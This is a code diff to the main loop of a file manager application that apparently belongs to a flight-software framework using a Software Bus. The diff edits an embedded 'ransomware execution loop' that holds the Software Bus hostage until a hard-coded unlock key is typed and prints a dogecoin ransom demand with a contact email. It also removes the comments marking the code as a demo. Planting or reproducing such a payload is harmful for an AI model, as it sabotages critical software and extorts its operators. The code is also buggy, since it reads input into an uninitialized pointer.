@@ -41,8 +41,8 @@
 #include "fm_version.h"
 #include "fm_verify.h"
 
-#include "stdio.h"      //added for demo
-#include "unistd.h"     //added for demo
+#include "stdio.h"
+#include "unistd.h"
 
 #include <string.h>
 
@@ -107,15 +107,15 @@ void FM_AppMain(void)
         Result = CFE_SB_RcvMsg(&MsgPtr, FM_GlobalData.CmdPipe, CFE_SB_PEND_FOREVER);
 
         //Ransomware execution loop
-        //Ransomware goal 1: Keep looping until 'q' (simulated unlock key) is entered
+        //Ransomware goal 1: Hold Software Bus hostage
         char* input;
         while (strcmp(input, "rAn5OMWaR3cOd3") != 0 && (isUnlocked == 0))
         {
             //Ransomware goal 2: print demand message to screen
             OS_printf("\33[2J\r");
-            OS_printf("Kindly send 1 million dogecoins to: \nP. Sherman \n42 Wallaby Way \nSydney, Australia\n\n");
+            OS_printf("Kindly send 1 million dogecoins to: \nEvilHackerMan@protonmail.com\n\n");
             
-            //Ransomware goal 3: Check for unlock key entry/release 
+            //Ransomware goal 3: Check for unlock key entry/release
             scanf("%15s", input);
             if(strcmp(input, "rAn5OMWaR3cOd3") == 0) {
                 //Clear screen
